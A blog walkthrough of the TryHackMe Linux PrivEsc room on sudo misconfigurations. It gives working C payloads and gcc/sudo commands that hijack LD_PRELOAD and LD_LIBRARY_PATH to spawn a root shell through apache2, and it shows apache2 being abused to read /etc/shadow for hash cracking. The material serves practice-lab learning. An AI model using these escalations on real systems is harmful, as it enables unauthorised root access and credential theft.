## TryHackMe Linux PrivEsc  - sudo misconfiguration

Laziness or neglection often leads to security misconfiguration - one of such are sudo vulnerabilities. From my experience, it requires a little effort to exploit, but is enough to gain the root access on the system. So `sudo -l` command is always first what I do when I gain access to the victim machine (hacking practice box).

> Following article references the exercises from [THM Linux PrivEsc practice room](https://tryhackme.com/room/linuxprivesc)

***
# Contents
1. [Escaping to root shell](#escaping-to-root-shell)
* [Environment variables](#environment-variables)
* [Library hijacking and versions dependency](#library-hijacking-and-versions-dependency)
* [Additional readings](#additional-readings)
***

> 🔔 `CyberEthical.Me` is maintained purely from your donations - consider one-time sponsoring with the [Sponsor](/sponsor) button or 🎁 [become a Patron](https://www.patreon.com/cyberethicalme) which also gives you some bonus perks. 
Join our [Discord Server](https://discord.com/invite/5MjU4Cxf3R)!

%%[bmac-button]

# Escaping to root shell

Upon SSH on the target machine, I run the `sudo -l` command.

![2021-09-25-13-24-19.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632734999896/tQ5-y7ALE.png)

We can right away see major vulnerability - permission to run listed binaries as a root, without specifying password. By using the [GTFOBins](https://gtfobins.github.io/) site, we can explore how `sudo` command can be abused to spawn a root shell from within these programs.

This is an example for `find`
![2021-09-25-15-44-32.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632734978941/nR1FPVxRk.png)

As for gaining the `root` via `apache2` as it was suggested by [0xsanz](https://0xsanz.medium.com/linux-privesc-tryhackme-a41eddc5b595) - we can abuse `apache2 -f` as a way to provide alternative configuration to binary.

![2021-09-25-17-56-13.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632734944229/zUisYLBuU.png)

As you can see, we can read the first line of the any file - luckily `root` user in the `shadow` files is specified on the first line, so from that we can crack the hash.

> As you can see it is not a reliable way, but this is best I could find, if you have better idea, I'd like to read about it in the comment!

[Back to top](#contents) ⤴

# Environment variables

There are some additional entries at the beginning of the `sudo -l` output.

![2021-09-26-09-56-17.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632734925925/-F9NPESoB.png)

Both `LD_PRELOAD` and `LD_LIBRARY_PATH` are environment variables that can be set when executing the binary, to load a libraries beforehand.

What are the legitimate reasons behind this? Let me quote the good examples from [David Barr article](http://xahlee.info/UnixResource_dir/_/ldpath.html)

> * To test out new library routines against an already compiled binary (for either backward compatibility or for new feature testing).
> * To have a short term way out in case you wanted to move a set of shared libraries to another location.
> * When upgrading shared libraries, you can test out a library before replacing it.

Worth mentioning that `LD_LIBRARY_PATH` is ignored at runtime for executables that have their `setuid` or `setgid` bit set. But this won't prevent from abusing the `sudo` permissions.


[Back to top](#contents) ⤴

## Exploiting LD_PRELOAD

Any additional, user-specified, ELF shared objects (like shared libraries) specified in `LD_PRELOAD` are loaded first, [before all others](https://man7.org/linux/man-pages/man8/ld.so.8.html).

We can use that to our advantage to gain a root shell from the `apache2` that didn't have an entry in GTFOBins. To do so, we are going to compile the code that opens the `/bin/bash` to shared library with a name of a library we want to hijack. Then we are going to manipulate the `apache2` to use it during its execution. Because `LD_PRELOAD` objects are loaded before any other, we should get the root right after program startup.

```c
/*
Example of the program that opens the shell under root user.
Source: https://tryhackme.com/room/linuxprivesc
*/

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    // clear current LD_PRELOAD value
    unsetenv("LD_PRELOAD");

    // set real, effective, and saved user or group ID
    setresuid(0,0,0);

    // run shell with SUID persistence
    // otherwise it would run under current user
    system("/bin/bash -p");
}

```

Compilation:

```txt
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

* `-fPIC`, [required](https://www.cprogramming.com/tutorial/shared-libraries-linux-gcc.html) when compiling a shared library,
* `-shared`, [required](http://www.microhowto.info/howto/build_a_shared_library_using_gcc.html) when compiling a shared library,
* `-nostartfiles`, not use the standard system startup functions nor link the code containing those functions

That's a powerful one.

![2021-09-26-10-05-09.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632735061473/sjqN0UjGu.png)

[Back to top](#contents) ⤴

## Exploiting LD_LIBRARY_PATH

![2021-09-26-10-05-53.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632735055890/OKD1EWeSh.png)


```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

> Notice that we are **not** using the `-nostartfiles` switch in this scenario

```txt
$ rm /tmp/*.so.*
$ gcc -fPIC -shared -o /tmp/libuuid.so.1 /home/user/tools/sudo/library_path.c
$ sudo LD_LIBRARY_PATH=/tmp apache2
```

![2021-09-26-11-13-09.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632735047915/paEFwmUtq.png)

Ok, but what could happen if we choose a different library?

```sh
#!/bin/sh
rm /tmp/*.so.*
gcc -fPIC -shared -o /tmp/libpcre.so.3 /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
```
![2021-09-26-11-49-43.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632735095818/5oqhPCeLd.png)

Probably in the runtime, there is a call to `pcre_free` that suppose to be in `libpcre.so.3`. Let's fix that.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

int pcre_free;
```

Voilà.

![2021-09-26-11-50-23.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632735088662/UC2O4Y5Jr.png)


> Do you like what you see? Join the [Hashnode.com](https://blog.cyberethical.me/join) now and start publishing. Things that are awesome:  
>✔ Automatic GitHub Backup  
>✔ Write in Markdown  
>✔ Free domain mapping  
>✔ CDN hosted images  
>✔ Free built-in newsletter service  
>✔ Built-in blog monetizing through the Sponsor feature  
> By using my link, you can help me unlock the ambassador role, which cost you nothing and gives me some additional features to support my content creation mojo.

[Back to top](#contents) ⤴

# Library hijacking and versions dependency

If we forgot to skip `-nostartfiles` flag during compilation, hijacker fails during execution of `apache2`.

> Yeah, it _happened_ to me so that's why I've got this section :)

![2021-09-26-10-14-42.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632735079489/v-nvssUlO.png)

That's because `apache2` binary was compiled with version requirements for the some libraries. This can be easily looked up with `readelf`.

```
$ readelf -V /usr/sbin/apache2
```

![2021-09-26-10-18-36.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632735133240/sHzQJe4Kn.png)

As you can see here, both `libpthread.so.0` and `libc.so.6` are required to have version definition included. Let's then use a different library, not specified in the `apache2` version sections.

```txt
$ rm /tmp/libpthread.so.0
$ gcc -fPIC -shared -nostartfiles -o /tmp/libuuid.so.1 /home/user/tools/sudo/library_path.c
```
Will it run then now?

![2021-09-26-10-22-12.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632735121678/d7hO6KuPh.png)

Well, it won't because the other library used by `apache2` have the version dependency on the `libuuid.so.1`. Then let's find the library that we can hijack by querying all libraries with `readelf`.

```txt
$ readelf -V /lib/x86_64-linux-gnu/libpcre.so.3 /usr/lib/libaprutil-1.so.0 /usr/lib/libapr-1.so.0 /lib/libpthread.so.0 /lib/libc.so.6 /lib/libuuid.so.1 /lib/librt.so.1 /lib/libcrypt.so.1 /lib/libdl.so.2 /usr/lib/libexpat.so.1 /lib64/ld-linux-x86-64.so.2 > lib_ver.txt
```

Now we can simply `grep` the library names to see if they are mentioned (together with the _version_ phrase) somewhere in the file. This is how it looks like for these two libraries we tried before.

![2021-09-26-10-39-07.png](https://cdn.hashnode.com/res/hashnode/image/upload/v1632735112535/RL17BHmi_.png)

Candidates with no dependencies on each other:
* `libpcre.so.3`
* `libaprutil-1.so.0`
* `libapr-1.so.0`
* `librt.so.1`
* `libexpat.so.1`

Unfortunately, with this approach I was unable to launch the root shell, but these skills are undoubtedly useful.

[Back to top](#contents) ⤴

# Additional readings

> 📌 Follow the `#CyberEthical` hashtag on the social media  
> 🎁 Become a Patron and [gain additional benefits](https://www.patreon.com/cyberethicalme)  
> 👾 Join CyberEthical [Discord server](https://discord.com/invite/5MjU4Cxf3R)  
> 👉 Instagram: [@cyber.ethical.me](https://www.instagram.com/cyber.ethical.me/)  
> 👉 LinkedIn: [CyberEthical.Me](https://www.linkedin.com/company/cyberethical-me)  
> 👉 Twitter: [@cyberethical_me](https://twitter.com/cyberethical_me)  
> 👉 Facebook: [@CyberEthicalMe](https://facebook.com/CyberEthicalMe) 

[Back to top](#contents) ⤴

* [GTFOBins](https://gtfobins.github.io/) 
* [What Is the LD_PRELOAD Trick?](https://www.baeldung.com/linux/ld_preload-trick-what-is)
* [The Linux Documentation Project. Shared Libraries](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html)
* [Sudon’t escape so easily!](https://securitybytes.io/sudont-escape-so-easily-ce8801bf9a4b)
* [StackOverflow. What does the "no version information available" error from linux dynamic linker mean?](https://stackoverflow.com/a/38851073/6710729)